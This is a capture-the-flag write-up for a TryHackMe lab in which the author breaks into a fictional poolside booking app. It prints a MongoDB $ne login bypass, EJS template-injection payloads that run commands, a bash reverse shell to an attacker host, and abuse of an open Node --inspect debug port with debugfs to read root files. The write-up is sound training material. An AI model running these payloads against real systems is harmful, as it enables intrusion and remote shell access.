# Day 07
- **Challenge name:** [Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644)
- **Category:** Boot2Root / Pentesting
- **Difficulty:** Medium
- **Date completed:** 2nd of August 2026

> Thanks to @animsparrow for pointing me toward the Node inspector pivot for root - I wouldn't have found that path on my own.

## Summary
The story for this one: you're poolside at Byte Lotus, a booking platform for cabanas and sunbeds. Wallet balances are changing on their own, sessions are being hijacked, and someone's clearly already inside the system. The web app itself turned out to be the way in - a login form that trusted user input a bit too much, and a "staff" feature that trusted it even more.

Getting a shell meant chaining two separate bugs together. Getting to root meant finding a debugging port left open that nobody should have left open.

## Exploitation / Walkthrough
### Step 1
I ran an nmap scan against the lab machine:

```bash
nmap -sC -sV -p- -T4 <target IP>
```

Only two ports open: SSH (22), and a Node.js/Express web app on port 80, titled "Byte Lotus — Poolside".

### Step 2
I fuzzed the site for hidden paths:

```bash
ffuf -u http://<target IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.json,.txt -mc 200,301,302,403 -t 50
```

Found `/logout` and `/staff` (the latter returned a 403 - it existed but I wasn't allowed in yet).

### Step 3
The homepage had a login form (`/login`). Since it's an Express app, I tried sending JSON instead of a normal form post, with a NoSQL injection payload targeting MongoDB's query operators:

```bash
curl -s -i -X POST http://<target IP>/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

The `$ne` (not equal) operator meant "log me in as anyone whose password isn't blank" - which is everyone. The server didn't sanitise the input, so this logged me in without knowing any real credentials, and handed back a session cookie.

### Step 4
Using that cookie, `/staff` opened up. It was a "Cabana Desk" console with a form to customise a guest booking-confirmation message, rendered through EJS templates - and it let me submit my own template.

I tested for Server-Side Template Injection:

```bash
curl -s -X POST http://<target IP>/staff/preview \
  -H "Cookie: connect.sid=<cookie>" \
  --data-urlencode "template=<%= 7*7 %>"
```

It returned `49` - meaning the server was actually executing my template instead of just displaying it. Confirmed SSTI.

### Step 5
Straight `require()` was blocked ("require is not defined"), but EJS still exposes Node's global `process` object, so I reached `require` through `global.process.mainModule.require` instead:

```bash
curl -s -X POST http://<target IP>/staff/preview \
  -H "Cookie: connect.sid=<cookie>" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
```

Came back `uid=996(poolside)` - confirmed remote code execution.

### Step 6
I set up a listener on my attack box:

```bash
nc -lvnp 4444
```

Then sent the same trick, but with a reverse shell command instead of `id`:

```bash
<%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/<attacker IP>/4444 0>&1'").toString() %>
```

Submitted through the same `/staff/preview` endpoint, and got a connection back on my listener - a shell as `poolside`.

### Step 7
Found the user flag straight away:

```bash
find / -name "user.txt" 2>/dev/null
cat /home/poolside/user.txt
```

And voilà, there you have it!

### Step 8
`sudo -l` wanted a password I didn't have, so that was a dead end. Instead I checked running processes and noticed another local account, `pipelinesvc`, running a Node.js process with a debugging port left open:

```bash
ps aux | grep -i node
```

```
pipelin+ ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

Node's `--inspect` flag opens a debugging port (Chrome DevTools Protocol) that lets anyone who can reach it run arbitrary JavaScript in that process - including `require('child_process')`. Since it was only bound to localhost, but I already had a shell on the box, I could reach it directly.

### Step 9
I queried the debugger for its connection details:

```bash
curl -s http://127.0.0.1:9229/json/list
```

That gave me a `webSocketDebuggerUrl` with a UUID. I wrote a small raw Node.js script to open a WebSocket connection to that debugger and send a `Runtime.evaluate` command:

```bash
node /tmp/cdp.js "id"
```

Result: `uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)`.

Pivoted from `poolside` to code execution as `pipelinesvc`, without ever needing its password - and that account was in the `disk` group.

### Step 10
Membership in the `disk` group means read access to raw block devices - which sidesteps normal file permissions entirely. First I found the right device:

```bash
node /tmp/cdp.js "cat /proc/partitions"
```

`/dev/nvme0n1p1` was the main filesystem partition. Then I read the root flag straight off the raw disk using `debugfs`, without ever needing to be root or even have file read permission on `/root`:

```bash
node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>&1"
```

And voilà, there you have it!

## Flag
![redacted](https://img.shields.io/badge/-REDACTED-000000) - to avoid spoilers, correct flag will be posted after the event is concluded.

## Lessons Learned
A few things stood out here. First, always sanitise input before it reaches a database query - `$ne` and other MongoDB operators being accepted straight from a JSON body is a classic and dangerous mistake. Second, letting users submit their own template strings (EJS or otherwise) is effectively giving them code execution unless it's heavily sandboxed - and even then, `global.process` can be a way around a naive sandbox. Third, and biggest: never leave a Node.js `--inspect` debugging port open on a production box, even bound to localhost - if an attacker gets any foothold on the machine, that port hands them full code execution as whatever user started it. And finally, group membership matters as much as user accounts - being in the `disk` group is functionally close to being root, since it bypasses file permissions entirely.
